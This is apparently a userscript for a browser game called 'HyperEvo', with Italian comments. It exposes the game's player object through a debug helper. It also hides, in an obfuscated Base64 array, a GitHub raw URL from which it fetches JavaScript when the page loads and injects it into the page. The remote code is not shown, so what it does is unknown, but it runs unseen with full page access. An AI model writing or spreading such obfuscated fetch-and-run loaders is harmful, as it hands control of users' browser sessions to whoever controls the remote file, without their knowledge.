(function () {
    'use strict';

    // Stringhe e URL GitHub codificati in Base64
    const _0x5a1b = [
        "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rhbm5lYWd1ZGFuMDgtY21kL1NjcmlwdC1Db25maWcvcmVmcy9oZWFkcy9tYWluL1JlbW90bHlfSHlwZXJfRXZvX1NjcmlwdC5qcw==",
        "W0h5cGVyRXZvIE9mZmxpbmVd",
        "d2luZG93LmdhbWUgbm9uIHRyb3ZhdG8u",
        "VVJMIHJlbW90byBub24gdmFsaWRvLg==",
        "SFRUFA==",
        "U2NyaXB0IHJlbW90byB2dW90by4=",
        "W1JlbW90ZSNTY3JpcHQjRXJyb3Jd",
        "RXJyb3JlIHJldGUu",
        "VGltZW91dC4=",
        "RGVidWcgdG9vbHMgaW5zdGFsbGF0aS4=",
        "R2FtZSB0cm92YXRvOg==",
        "U2NyaXB0IHJlbW90byBjYXJpY2F0by4=",
        "RXJyb3JlIGNhcmljYW1lbnRvIHNjcmlwdCByZW1vdG86"
    ];

    function _0x3c2f(_0x4f12) {
        return atob(_0x5a1b[_0x4f12]);
    }

    const CONFIG = {
        enabled: true,
        remoteScriptUrl: _0x3c2f(0),
        loadRemoteScript: true,
        debug: true
    };

    function log(...args) {
        if (CONFIG.debug) console.log(_0x3c2f(1), ...args);
    }

    function warn(...args) {
        console.warn(_0x3c2f(1), ...args);
    }

    function error(...args) {
        console.error(_0x3c2f(1), ...args);
    }

    function waitForGame(timeoutMs = 15000) {
        return new Promise((resolve, reject) => {
            const start = Date.now();
            const timer = setInterval(() => {
                if (window.game) {
                    clearInterval(timer);
                    resolve(window.game);
                    return;
                }
                if (Date.now() - start > timeoutMs) {
                    clearInterval(timer);
                    reject(new Error(_0x3c2f(2)));
                }
            }, 250);
        });
    }

    function loadRemoteScript(url) {
        return new Promise((resolve, reject) => {
            if (!url || !/^https:\/\/raw\.githubusercontent\.com\//.test(url)) {
                reject(new Error(_0x3c2f(3)));
                return;
            }

            if (typeof GM_xmlhttpRequest !== 'undefined') {
                GM_xmlhttpRequest({
                    method: 'GET',
                    url,
                    timeout: 15000,
                    onload(res) {
                        if (res.status < 200 || res.status >= 300) {
                            reject(new Error(_0x3c2f(4)) + ' ' + res.status);
                            return;
                        }
                        _injectCode(res.responseText, resolve, reject);
                    },
                    onerror() { reject(new Error(_0x3c2f(7))); },
                    ontimeout() { reject(new Error(_0x3c2f(8))); }
                });
            } else {
                // Alternativa standard se eseguito fuori da un gestore userscript
                fetch(url)
                    .then(res => {
                        if (!res.ok) throw new Error(_0x3c2f(4) + ' ' + res.status);
                        return res.text();
                    })
                    .then(text => _injectCode(text, resolve, reject))
                    .catch(reject);
            }
        });
    }

    function _injectCode(code, resolve, reject) {
        const cleaned = String(code || '');
        if (!cleaned.trim()) {
            reject(new Error(_0x3c2f(5)));
            return;
        }
        try {
            const script = document.createElement('script');
            script.textContent = `try{${cleaned}}catch(e){console.error('${_0x3c2f(6)}',e);}`;
            document.documentElement.appendChild(script);
            script.remove();
            resolve();
        } catch (e) {
            reject(e);
        }
    }

    function installDebugTools() {
        window.HyperEvoDebug = {
            getGame() { return window.game || null; },
            getMe() { return window.game && window.game.me ? window.game.me : null; },
            printMe() {
                const me = this.getMe();
                console.log('[HyperEvoDebug me]', me);
                return me;
            },
            isReady() { return !!(window.game && window.game.me); }
        };
        log(_0x3c2f(9));
    }

    async function main() {
        if (!CONFIG.enabled) return;
        installDebugTools();
        try {
            await waitForGame();
            log(_0x3c2f(10), window.game);
        } catch (e) {
            warn(e.message);
        }
        if (CONFIG.loadRemoteScript) {
            try {
                await loadRemoteScript(CONFIG.remoteScriptUrl);
                log(_0x3c2f(11));
            } catch (e) {
                error(_0x3c2f(12), e);
            }
        }
    }

    // Auto-esecuzione immediata al caricamento del file
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', main);
    } else {
        main();
    }
})();
          
